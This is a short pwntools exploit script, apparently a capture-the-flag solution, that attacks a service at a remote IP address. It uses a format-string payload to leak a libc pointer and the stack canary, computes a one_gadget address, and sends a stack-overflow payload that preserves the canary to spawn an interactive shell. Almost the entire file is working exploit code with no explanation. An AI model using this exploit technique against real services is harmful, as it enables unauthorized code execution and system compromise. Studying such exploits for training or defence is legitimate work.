# libc 2.23

from pwn import *

libc = ELF('./libc.so.6')

def DEBUG():
	script = ''
	gdb.attach(r, script)

#r = process('./q3')
r = remote('68.183.158.95', 8991)

payload = "|%7$p|%11$p"
r.sendline(payload)

r.recvuntil('|')
stdin = int(r.recvn(14), 16)
print "stdin @ ", hex(stdin)
libc_base = stdin - libc.symbols['_IO_2_1_stdin_']
one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

one_shot = libc_base + one_gadget[0]
r.recvuntil('|')
canary = int(r.recvline().strip(), 16)
print "canary = ", hex(canary)
print "one_shot @ ", hex(one_shot)

#DEBUG()
payload = 'a'*0x18 + p64(canary) + 'a'*0x8 + p64(one_shot)
r.sendline(payload)

r.interactive()
